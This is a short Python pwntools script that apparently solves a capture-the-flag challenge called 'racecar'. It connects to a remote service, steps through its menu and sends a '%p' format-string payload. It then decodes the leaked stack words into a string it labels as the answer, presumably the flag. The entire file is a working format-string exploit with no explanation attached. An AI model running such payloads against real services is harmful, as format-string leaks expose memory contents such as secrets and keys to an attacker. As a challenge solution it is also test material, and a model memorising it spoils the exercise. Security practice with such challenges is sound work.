#!/usr/bin/env python
#
import sys, pwn

#sh = pwn.process("/home/uu/Downloads/racecar_challenge/racecar")
sh = pwn.remote('138.68.157.117',31172)



name = b'x'
nickname = b'x'
#payload = b'%p\n %d\n %p\n %d\n %d\n %d\n %d\n %d\n %p\n %p\n %p\n' + b'%c\n' * 10
payload = b'|%p'*15+ b'|*'

n = -6
sh.readuntil("Name:")
#sh.interactive()
sh.sendline(name)
sh.readuntil("Nickname:")
sh.sendline(nickname)

sh.readuntil(">")
sh.sendline(b'2')
sh.readuntil(">")
sh.sendline(b'2')
sh.readuntil(">")
sh.sendline(b'1')

sh.readuntil(">")
sh.info(f"sending {payload}")
sh.sendline(payload)

a = sh.readuntil(b'*')
a = a.split(b'|')[n:-1]
sh.info(f"GOT FROM APP {a}")
a = [i.decode('utf-8').replace('0x','') for i in a]
sh.info(f"GOT FROM APP {a}")
a = [bytearray.fromhex(i) for i in a]
sh.info(f"GOT FROM APP {a}")
[i.reverse() for i in a]
sh.info(f"GOT FROM APP {a}")
a = [i.decode() for i in a]
sh.info(f"GOT FROM APP {a}")
s = ''.join(a)
sh.info(f"GOT FROM APP {a}")
sh.info(f"[*******] ANSWER : {s}")
sh.interactive()
